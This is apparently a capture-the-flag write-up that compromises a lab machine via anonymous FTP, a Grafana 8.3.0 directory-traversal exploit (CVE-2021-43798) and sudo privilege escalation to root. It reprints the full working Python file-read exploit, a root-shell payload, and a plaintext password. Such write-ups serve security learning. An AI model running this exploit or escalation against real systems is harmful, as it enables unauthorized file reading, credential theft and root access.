# ENUMERATION


## OPEN PORTS

![Pasted image 20241025014342.png](../../IMAGES/Pasted%20image%2020241025014342.png)


```ad-note
OPEN PORTS

21: `FTP (Anonymous login enabled)`
22: `SSH`
80: `HTTP`
3000: `HTTP`

```

First, we need to log into ftp taking advantage of that anonymous login that's enabled:

![Pasted image 20241025014539.png](../../IMAGES/Pasted%20image%2020241025014539.png)
We have a directory called `mantenimiento`, inside of this directory, we can find the following:

![Pasted image 20241025014619.png](../../IMAGES/Pasted%20image%2020241025014619.png)

A `database.kdbx` file is found inside of it, let's download it to our host machine and inspect it:

![Pasted image 20241025014823.png](../../IMAGES/Pasted%20image%2020241025014823.png)

If we try to use `keepass2` on the file, it is protected by a password, let's start with our websites enumeration to get that password.

We have two websites, let's try to enumerate them further using fuzzing and other techniques

## FUZZING

### PORT 80 WEBSITE

![Pasted image 20241025014929.png](../../IMAGES/Pasted%20image%2020241025014929.png)

Found a `/maintenance.html` directory that may be useful, let's visit it:

![Pasted image 20241025015023.png](../../IMAGES/Pasted%20image%2020241025015023.png)

So, seems like the password is in the `/tmp` directory, seems like we need to perform a path traversal in some sort of way to get that, let's enumerate the other website



### PORT 3000 WEBSITE

![Pasted image 20241025013600.png](../../IMAGES/Pasted%20image%2020241025013600.png)
A lot came from it, so, fuzzing seems pretty useless here, let's visit the website:

![Pasted image 20241025013631.png](../../IMAGES/Pasted%20image%2020241025013631.png)

Default page is a login page, something interest I found was this:


![Pasted image 20241025015156.png](../../IMAGES/Pasted%20image%2020241025015156.png)


Seems like it is running a `grafana` om the `v8.3.0`, let's search for some exploit in this version

![Pasted image 20241025015326.png](../../IMAGES/Pasted%20image%2020241025015326.png)

Perfect, found exactly what I needed, a [[CYBERSECURITY/Bug Bounty/Vulnerabilities/SERVER SIDE VULNERABILITIES/PATH TRAVERSAL|path traversal]] vulnerability that allow us to read that `/tmp/pass.txt` file:

```ad-important
exploit: [exploit](https://www.exploit-db.com/exploits/50581)
```

```python
# Exploit Title: Grafana 8.3.0 - Directory Traversal and Arbitrary File Read
# Date: 08/12/2021
# Exploit Author: s1gh
# Vendor Homepage: https://grafana.com/
# Vulnerability Details: https://github.com/grafana/grafana/security/advisories/GHSA-8pjx-jj86-j47p
# Version: V8.0.0-beta1 through V8.3.0
# Description: Grafana versions 8.0.0-beta1 through 8.3.0 is vulnerable to directory traversal, allowing access to local files.
# CVE: CVE-2021-43798
# Tested on: Debian 10
# References: https://github.com/grafana/grafana/security/advisories/GHSA-8pjx-jj86-j47p47p

#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import requests
import argparse
import sys
from random import choice

plugin_list = [
    "alertlist",
    "annolist",
    "barchart",
    "bargauge",
    "candlestick",
    "cloudwatch",
    "dashlist",
    "elasticsearch",
    "gauge",
    "geomap",
    "gettingstarted",
    "grafana-azure-monitor-datasource",
    "graph",
    "heatmap",
    "histogram",
    "influxdb",
    "jaeger",
    "logs",
    "loki",
    "mssql",
    "mysql",
    "news",
    "nodeGraph",
    "opentsdb",
    "piechart",
    "pluginlist",
    "postgres",
    "prometheus",
    "stackdriver",
    "stat",
    "state-timeline",
    "status-histor",
    "table",
    "table-old",
    "tempo",
    "testdata",
    "text",
    "timeseries",
    "welcome",
    "zipkin"
]

def exploit(args):
    s = requests.Session()
    headers = { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.' }

    while True:
        file_to_read = input('Read file > ')

        try:
            url = args.host + '/public/plugins/' + choice(plugin_list) + '/../../../../../../../../../../../../..' + file_to_read
            req = requests.Request(method='GET', url=url, headers=headers)
            prep = req.prepare()
            prep.url = url
            r = s.send(prep, verify=False, timeout=3)

            if 'Plugin file not found' in r.text:
                print('[-] File not found\n')
            else:
                if r.status_code == 200:
                    print(r.text)
                else:
                    print('[-] Something went wrong.')
                    return
        except requests.exceptions.ConnectTimeout:
            print('[-] Request timed out. Please check your host settings.\n')
            return
        except Exception:
            pass

def main():
    parser = argparse.ArgumentParser(description="Grafana V8.0.0-beta1 - 8.3.0 - Directory Traversal and Arbitrary File Read")
    parser.add_argument('-H',dest='host',required=True, help="Target host")
    args = parser.parse_args()

    try:
        exploit(args)
    except KeyboardInterrupt:
        return


if __name__ == '__main__':
    main()
    sys.exit(0)
            
```


# EXPLOITATION

## LAUNCHING THE EXPLOIT

So, with the exploit in our hands, let's start with the next stage, let's launch the attack and try to read `/etc/passwd` to check if it works:

![Pasted image 20241025015835.png](../../IMAGES/Pasted%20image%2020241025015835.png)
And it works correctly, let's read our `/tmp/pass.txt` file!

![Pasted image 20241025015908.png](../../IMAGES/Pasted%20image%2020241025015908.png)

```ad-hint
`/tmp/pass.txt`: `t9sH76gpQ82UFeZ3GXZS`
```


Nice, we got what we needed, let's log in ssh using that password and the user `freddy` we previously read in that `/etc/passwd` file:

![Pasted image 20241025020149.png](../../IMAGES/Pasted%20image%2020241025020149.png)

Nice, we got access, let's start with the privilege escalation.

# PRIVILEGE ESCALATION



## SUDO -L

![Pasted image 20241025020240.png](../../IMAGES/Pasted%20image%2020241025020240.png)

Seems like we have a `/opt/maintenance.py` file we can exploit in order to get root access, let's check at the code:

![Pasted image 20241025020359.png](../../IMAGES/Pasted%20image%2020241025020359.png)

Something simple, just a print statement on it, let's check if we can write in it:

![Pasted image 20241025020446.png](../../IMAGES/Pasted%20image%2020241025020446.png)

And we can indeed write in it, let's escalate our privileges, for this, I used this code:

```python
import os
os.system("/usr/bin/python3 -c 'import os; os.system(\"/bin/bash\")'")
```

This will pop a new shell with root privileges:

![Pasted image 20241025020740.png](../../IMAGES/Pasted%20image%2020241025020740.png)

And just like that, the CTF is done!
